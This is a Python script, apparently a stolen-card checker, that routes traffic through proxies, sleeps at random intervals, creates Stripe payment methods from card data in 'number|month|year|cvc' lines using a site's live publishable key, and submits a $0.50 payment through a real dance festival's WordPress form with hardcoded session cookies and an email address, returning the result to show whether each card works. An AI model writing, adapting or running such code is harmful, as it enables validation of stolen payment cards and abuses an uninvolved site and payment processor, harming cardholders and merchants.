import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))

        headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'origin': 'https://js.stripe.com',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://js.stripe.com/',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
}

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9ffc663c-69d5-4005-aabd-782094c4d8ad1ddbb2&muid=af5efb6d-7ff6-4b45-bb4d-22890a4325d5f8e0e4&sid=e4cdeca2-87e1-4ccf-9919-7b07324dec5ddc1b04&pasted_fields=number&payment_user_agent=stripe.js%2F17c82e8501%3B+stripe-js-v3%2F17c82e8501%3B+card-element&referrer=https%3A%2F%2Fwww.nydancefestival.com&time_on_page=113681&key=pk_live_51JpC3aJiW9RFz0o9HbCVmFFrk4N1Vs262IlowuME9i3BILaHlCzvBWaYmBiGdDpTUR41hxWX7x6uAvOpo2wVfb3Q00rqnkymEH'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            id = response.json()['id']
        except:
            pass


        cookies = {
    'PHPSESSID': 'q60foc4iksnd7m9rr9266og7d3',
    '_ga': 'GA1.1.1042038214.1733905454',
    '_fbp': 'fb.1.1733905454647.996945335281318848',
    '__stripe_mid': 'af5efb6d-7ff6-4b45-bb4d-22890a4325d5f8e0e4',
    '__stripe_sid': 'e4cdeca2-87e1-4ccf-9919-7b07324dec5ddc1b04',
    '_ga_NZ0SDZ3T78': 'GS1.1.1733905453.1.1.1733905701.0.0.0',
}

        headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'x-requested-with': 'XMLHttpRequest',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'origin': 'https://www.nydancefestival.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.nydancefestival.com/pay/',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    # 'Cookie': 'PHPSESSID=q60foc4iksnd7m9rr9266og7d3; _ga=GA1.1.1042038214.1733905454; _fbp=fb.1.1733905454647.996945335281318848; __stripe_mid=af5efb6d-7ff6-4b45-bb4d-22890a4325d5f8e0e4; __stripe_sid=e4cdeca2-87e1-4ccf-9919-7b07324dec5ddc1b04; _ga_NZ0SDZ3T78=GS1.1.1733905453.1.1.1733905701.0.0.0',
}

        params = {
    't': '1733905708558',
}

        data = {
    'data': f'__fluent_form_embded_post_id=17875&_fluentform_6_fluentformnonce=5246454ec6&_wp_http_referer=%2Fpay%2F&names%5Bfirst_name%5D=Khant%20Ti&names%5Blast_name%5D=Thua&email=thur07656%40gmail.com&custom-payment-amount=0.5&input_text=Hhhh&payment_method=stripe&__stripe_payment_method_id={id}',
    'action': 'fluentform_submit',
    'form_id': '6',
}

        r2 = requests.post(
    'https://www.nydancefestival.com/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip